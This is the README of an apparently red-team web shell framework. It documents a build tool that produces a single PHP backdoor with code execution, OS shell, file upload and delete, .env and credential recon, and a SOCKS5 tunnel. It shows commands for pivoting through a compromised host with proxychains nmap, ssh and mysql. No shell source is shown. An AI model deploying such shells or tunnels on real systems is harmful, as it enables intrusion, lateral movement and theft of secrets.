# Webshells

A modular, single-file web shell framework with a build generator. Development happens in clean, separated source modules — deployment is always a single file. Every build gets a unique SHA256 fingerprint.

> **Disclaimer:** This tool is intended for authorized penetration testing, red team operations, CTF competitions, and security research only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before use.

## Features

- **PHP Console** — execute PHP code with error handling, configurable timeout, and fatal error recovery
- **OS Shell** — auto-detected system command execution (probes `system`, `exec`, `shell_exec`, `passthru`, `popen`, `proc_open`) with persistent CWD, output size cap, and command history
- **SOCKS5 Tunnel** — embedded Neo-reGeorg tunnel endpoint for proxying traffic through the compromised host. Use with `neoreg.py` client + `proxychains` for nmap, SSH, database clients, etc.
- **File Browser** — navigate, download, upload, and delete files. Shows size, mtime, owner:group, permissions, symlink targets, and R/W flags
- **System Diagnostics** — full recon: identity, container detection, binary directories, interpreters/tools, writable dirs, ARP table, open ports (IPv4+IPv6), routing, installed panels (19+), .env file contents, process list
- **Command History** — persistent history with re-run and export
- **IndexedDB Storage** — all client data persists in the browser with full export/import

## Quick Start

```bash
# Default build — full featured, no auth
python generate.py

# Password-protected, minified, with operator fingerprint
python generate.py --password s3cret --minify --seed "op-nighthawk"

# With Neo-reGeorg tunnel embedded
python3 neoreg.py -g -k tunnelpass           # Generate tunnel files
python generate.py --tunnel neoreg_servers/tunnel.php --password s3cret

# Minimal build — exclude optional modules
python generate.py --exclude tunnel,diagnostics

# Verify a shell's integrity
python generate.py --verify dist/shell_a3f8c1e2.php
```

Output lands in `dist/`. Deploy the single `.php` file to a web server.

## Generator Options

| Flag | Description |
|------|-------------|
| `--lang php` | Target language (default: `php`) |
| `--password SECRET` | Bake in password protection (SHA256 hash embedded) |
| `--seed STRING` | Operator seed for unique fingerprinting |
| `--tunnel FILE` | Path to Neo-reGeorg generated `tunnel.php` (from `neoreg.py -g`) |
| `--minify` | Strip comments and collapse whitespace |
| `--exclude MODULES` | Comma-separated modules to exclude |
| `--output NAME` | Custom output filename |
| `--verify FILE` | Check integrity of a generated shell |

## Modules

| Module | Required | Description |
|--------|----------|-------------|
| `console` | Yes | PHP eval + OS shell |
| `files` | Yes | File browser, upload, delete, download |
| `tunnel` | No | Neo-reGeorg SOCKS5 tunnel endpoint |
| `diagnostics` | No | System recon, privesc hints, network info |
| `history` | No | Command history viewer |

Exclude optional modules with `--exclude tunnel,history,diagnostics` for a smaller footprint.

## SOCKS5 Tunnel

The tunnel embeds a [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg) endpoint directly into the webshell. This allows the operator to proxy TCP traffic through the compromised host using their own tools.

### Setup

```bash
# 1. Generate Neo-reGeorg tunnel with a key
python3 neoreg.py -g -k mypassword

# 2. Build webshell with tunnel embedded
python generate.py --tunnel neoreg_servers/tunnel.php --password shellpass

# 3. Deploy the shell, then connect
python3 neoreg.py -u https://target.com/shell.php -k mypassword

# 4. Use proxychains with any tool
proxychains nmap -sT -sV 10.0.0.0/24
proxychains ssh user@10.0.0.5
proxychains mysql -h 10.0.0.3 -u root -p
```

### What works through the tunnel

| Works | Doesn't work |
|-------|-------------|
| TCP connect scans (`nmap -sT`) | SYN scans (`nmap -sS`) — needs raw sockets |
| Service fingerprinting (`nmap -sV`) | UDP scans — SOCKS5 is TCP only |
| HTTP tools (curl, sqlmap, gobuster) | ICMP/ping sweeps — raw packets |
| DB clients (mysql, psql, redis-cli) | OS fingerprinting (`nmap -O`) |
| SSH, netcat, socat | ARP scanning — Layer 2 |

## Build Fingerprint

Every generated shell embeds a unique `__BUILD` object:

```json
{
  "hash": "a3f8c1e2...",
  "short_id": "a3f8c1e2",
  "timestamp": "2026-03-27T15:40:29Z",
  "lang": "php",
  "version": "1.0.0",
  "seed": "op-nighthawk"
}
```

- Visible in the **Diagnostics** tab under "Build Info"
- `--verify` mode checks the embedded hash
- Useful for operational deconfliction and attribution

## Password Protection

When built with `--password`, the shell shows a login page. The password is stored as a SHA256 hash — the plaintext is never in the file.

```bash
python generate.py --password "hunter2"
```

Logout via `?logout` query parameter.

## Project Structure

```
Webshells/
├── generate.py                     # Build tool (Python 3, zero dependencies)
├── templates/
│   └── php.tpl                     # PHP single-file template
├── src/
│   ├── backend/php/
│   │   ├── _order.json             # Assembly order
│   │   ├── auth.php                # Session auth (injected by generator)
│   │   ├── download.php            # GET file download handler
│   │   ├── tunnel.php              # Neo-reGeorg tunnel (injected by generator)
│   │   ├── filebrowser.php         # Directory listing
│   │   ├── fileops.php             # Delete + upload
│   │   ├── eval.php                # PHP code execution
│   │   ├── shell.php               # OS command execution
│   │   └── diagnostics.php         # System recon
│   ├── frontend/
│   │   ├── css/shell.css           # Dark theme styles
│   │   ├── js/
│   │   │   ├── _order.json         # Assembly order
│   │   │   ├── core.js             # Fetch, escaping, tab navigation
│   │   │   ├── db.js               # IndexedDB CRUD + export/import
│   │   │   ├── console.js          # PHP console UI
│   │   │   ├── shell.js            # OS shell UI + auto-probe
│   │   │   ├── tunnel.js           # Tunnel status + instructions
│   │   │   ├── diagnostics.js      # Diagnostics renderer
│   │   │   ├── history.js          # History viewer
│   │   │   └── filebrowser.js      # File browser UI
│   │   └── html/layout.html        # HTML layout with module markers
│   └── config/defaults.json        # Version + module definitions
├── dist/                           # Generated shells (gitignored)
└── .gitignore
```

## Adding a New Backend Language

The frontend (HTML/CSS/JS) is language-agnostic — it communicates via `fetch()` with JSON responses. Only the backend changes per language.

To add a new language:

1. Create `templates/{lang}.tpl` with placeholders: `{{AUTH_BLOCK}}`, `{{BACKEND}}`, `{{CSS}}`, `{{JS}}`, `{{HTML_BODY}}`, `{{BUILD_META_JSON}}`
2. Create `src/backend/{lang}/` with handler modules implementing the action contract
3. Add the language to `generate.py`'s `--lang` choices

### Backend Action Contract

| Action | POST Params | Response |
|--------|-------------|----------|
| `ls` | `dir` | `{"dir": "/path", "entries": [{name, path, dir, size, mtime, owner, group, perms, readable, writable, symlink, link_target, broken}, ...]}` |
| `delete` | `path` | `{"ok": true}` or `{"error": "msg"}` |
| `upload` | `dir`, `file` | `{"ok": true, "path": "...", "size": N, "overwritten": bool}` or `{"error": "msg"}` |
| `eval` | `code`, `timeout` | `{"output": "...", "error": "..."}` |
| `shell` | `cmd`, `cwd`, `timeout` | `{"output": "...", "cwd": "/new/path", "method": "system", "available": true, "truncated": bool}` |
| `diag` | — | `{"php_version": "...", "os": "...", "container": {...}, "bin_dirs": [...], "interpreters": [...], "env_files": {...}, ...}` |
| GET `?download=` | path in query | Raw file stream |

## Keyboard Shortcuts

| Key | Context | Action |
|-----|---------|--------|
| `Ctrl+Enter` | PHP Console | Execute code |
| `Enter` | OS Shell | Execute command |
| `Arrow Up/Down` | OS Shell | Navigate command history |
| `Ctrl+L` | OS Shell | Clear terminal output |

## Requirements

- **Generator:** Python 3.6+ (stdlib only, zero dependencies)
- **Runtime:** PHP 5.6+ (socket functions needed for tunnel)
- **Browser:** Any modern browser with IndexedDB support

## License

MIT
